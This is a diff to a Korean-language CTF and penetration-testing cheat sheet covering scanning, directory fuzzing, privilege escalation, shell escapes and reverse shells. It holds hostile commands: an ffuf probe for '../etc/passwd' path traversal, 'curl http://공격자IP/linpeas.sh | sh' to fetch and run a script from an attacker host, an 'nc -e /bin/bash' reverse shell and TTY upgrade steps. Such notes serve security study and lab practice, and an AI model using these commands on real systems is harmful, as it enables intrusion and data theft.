@@ -17,11 +17,12 @@ nmap -sC -sV -Pn -p- 192.168.1.100 -oN scan.txt
 
 ---
 
-### 🕷️ 2. 웹 디렉토리 열거
+### 🕷️ 2. 웹 디렉토리 열거 (Fuzzing)
 
 ```bash
 # gobuster 기본
-gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://target.com \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
 # 확장자 포함
 gobuster dir -u http://target.com \
@@ -30,7 +31,14 @@ gobuster dir -u http://target.com \
 
 # dirb (간단 버전)
 dirb http://target.com
+
+# ffuf — 숨겨진 파라미터 찾기 (LFI/SQLi 취약점 발굴용)
+# FUZZ 자리에 wordlist 단어를 하나씩 넣어서 파라미터명을 브루트포스
+ffuf -u "http://target.com/index.php?FUZZ=../../../../etc/passwd" \
+  -w /usr/share/wordlists/dirb/common.txt -fs 0
 ```
+
+> 💡 `-fs 0` : 응답 크기가 0바이트인 결과 필터링 (빈 응답 제거)
 
 ---
 
@@ -77,7 +85,23 @@ sudo -l
 
 ---
 
-### 🐚 5. 쉘 탈출 & 환경 복구
+### 🚀 5. 권한 상승 자동화 (LinPEAS)
+
+> `sudo -l`이나 SUID에서 힌트가 없을 때 LinPEAS로 자동 진단
+
+```bash
+# [공격자 머신] linpeas.sh 있는 디렉토리에서 웹 서버 열기
+python3 -m http.server 80
+
+# [타겟 쉘] 디스크에 저장 없이 메모리에서 바로 실행
+curl http://공격자IP/linpeas.sh | sh
+```
+
+> 💡 LinPEAS 다운로드: https://github.com/carlospolop/PEASS-ng
+
+---
+
+### 🐚 6. 쉘 탈출 & 업그레이드
 
 ```bash
 # rbash 탈출 (vi 이용)
@@ -85,18 +109,36 @@ vi
   :set shell=/bin/sh
   :shell
 
-# PATH 복구
+# PATH / SHELL 환경 복구
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 export SHELL=/bin/bash
 
-# python으로 bash 업그레이드
+# python으로 기본 bash 업그레이드
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+**완전한 인터랙티브 쉘로 업그레이드 (TTY 풀 세션):**
+
+```bash
+# 1. 타겟 쉘에서
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# 2. Ctrl + Z  (쉘을 백그라운드로 잠시 보냄)
+
+# 3. 내 칼리 터미널에서
+stty raw -echo; fg
+
+# 4. 엔터 두 번 후 타겟 쉘에서
+export TERM=xterm
+```
+
+> 💡 왜 쓰나? 기본 리버스 쉘은 화살표키, Ctrl+C, vi 등이 안 됨.
+> TTY 업그레이드 후엔 **진짜 터미널처럼** 사용 가능
+
 ---
 
-### 🔗 6. 리버스 쉘
+### 🔗 7. 리버스 쉘
 
 ```bash
 # 공격자 머신에서 리스너 열기
@@ -114,7 +156,7 @@ nc -e /bin/bash 공격자IP 4444
 
 ---
 
-### 🔐 7. 해시 & 인코딩
+### 🔐 8. 해시 & 인코딩
 
 ```bash
 # base64 디코딩
@@ -123,13 +165,13 @@ echo "인코딩된문자열" | base64 -d
 # base64 인코딩
 echo "텍스트" | base64
 
-# 해시 확인
+# 해시 종류 확인
 hash-identifier
 ```
 
 ---
 
-### 🌐 8. FTP / SSH
+### 🌐 9. FTP / SSH
 
 ```bash
 # FTP 익명 로그인
@@ -145,3 +187,13 @@ ssh user@192.168.1.100 -p 포트번호
 ```
 
 ---
+
+### 🔖 북마크 필수 사이트
+
+| 사이트 | 용도 |
+|--------|------|
+| [GTFOBins](https://gtfobins.github.io) | 쉘 탈출 / sudo 권한상승 방법 모음 |
+| [RevShells](https://www.revshells.com) | 리버스 쉘 원클릭 생성 |
+| [CrackStation](https://crackstation.net) | 온라인 해시 크랙 |
+| [HackTricks](https://book.hacktricks.xyz) | CTF 기법 백과사전 |
+| [PEASS-ng](https://github.com/carlospolop/PEASS-ng) | LinPEAS 권한상승 자동 스크립트 |
